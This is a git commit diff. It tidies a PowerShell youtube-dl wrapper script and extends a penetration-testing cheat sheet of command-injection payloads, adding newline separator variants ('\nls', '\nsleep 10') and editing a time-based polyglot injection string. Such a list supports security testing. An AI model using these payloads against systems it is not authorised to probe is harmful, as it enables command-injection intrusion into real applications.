9b6e9284c5d0ee8e2f73c84a55fdb2b771277204
MohammadGabr360 <Mohammad.Magdy.Gabr@hotmail.com>
2022-03-05 21:31:16 +0200

    +1

--- Utilities/Youtube.ps1
+++ Utilities/Youtube.ps1
@@ -3,4 +3,7 @@ Param(
     $SongName,
     $Artist
 )
-d:\YoutubeDownloader\youtube-dl.exe $URL -o "d:\Downloads\$Artist - $SongName.%(ext)s" -x --audio-format mp3
+$Download_Path = "D:\Downloads"
+Write-Host -ForegroundColor Cyan "[*] Downloading $SongName by $Artist from $URL"
+d:\YoutubeDownloader\youtube-dl.exe $URL -o "$Download_Path\$Artist - $SongName.%(ext)s" -x --audio-format mp3
+Write-Host -ForegroundColor Green "[+] $Artist - $SongName saved to $Download_Path"
--- Web-Penetration-Testing/Command-Injection-Separators-List.md
+++ Web-Penetration-Testing/Command-Injection-Separators-List.md
@@ -6,6 +6,7 @@
 &&ls;
 &ls;
 %0Als
+\nls
 `ls`
 $(ls)
 ```
@@ -19,11 +20,12 @@ $(ls)
 &&sleep 10;
 &sleep 10;
 %0Asleep 10
+\nsleep 10
 `sleep 10`
 $(sleep 10)
 ```
 
 ```
-1;sleep${IFS}9; #${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
+1;sleep${IFS}9; #${IFS}';sleep${IFS}9;                    #${IFS}";sleep${IFS}9;#${IFS}
 /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5`  #*/-sleep(5)||'"||sleep(5)||"/*`*/
 ```
